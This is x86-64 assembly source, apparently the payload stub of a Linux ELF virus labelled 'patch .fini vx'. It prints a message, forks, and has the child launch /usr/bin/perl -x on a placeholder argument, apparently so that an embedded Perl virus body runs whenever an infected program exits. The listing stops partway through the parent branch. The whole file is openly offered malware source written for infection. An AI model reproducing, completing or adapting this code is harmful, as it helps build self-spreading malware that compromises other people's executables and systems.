; linkin.s - patch .fini vx - by isra
BITS 64
global main
section .text
main:
    call run
    db "I tried so hard and got so far, but in the end it doesn't even matter", 0xa, 0x0
    db "/usr/bin/perl", 0x0
    db "-x", 0x0
    db "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
    db "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
    db "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
    db "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", 0x0
    
 run:
    ;;;;;;;;;;;;
    ; print msg
    ;;;;;;;;;;;;
    xor rax, rax
    xor rdx, rdx
    inc al
    mov rdi, rax
    pop rsi
    mov dl, 70
    syscall

    ;;;;;;;;
    ; fork
    ;;;;;;;;
    xor rax, rax
    mov rax, 57
    syscall
    test eax, eax
    jne parent

    ;;;;;;;;;;;;;;;;;;;;;;;;;
    ; call perl interpreter
    ;;;;;;;;;;;;;;;;;;;;;;;;;

    ; filename "/usr/bin/perl"
    lea rdi, [rsi+71]   
    
    ; argv
    ; ["/usr/bin/perl", "-x", "xxxxx..."] (on reverse)
    xor rdx, rdx
    push rdx
    lea rbx, [rsi+88] ; "xxx..."
    push rbx
    lea rbx, [rsi+85] ; "-x"
    push rbx
    push rdi          ; "/usr/bin/perl"
    mov rsi, rsp 

    ; execve & exit
    xor rax, rax
    mov rax, 59
    mov rdx, 0
    syscall
    xor rdx, rdx
    mov rax, 60
    syscall

parent:
    ; cleanup for the jmp instruction
    xor rax, rax
    xor rdx, rdx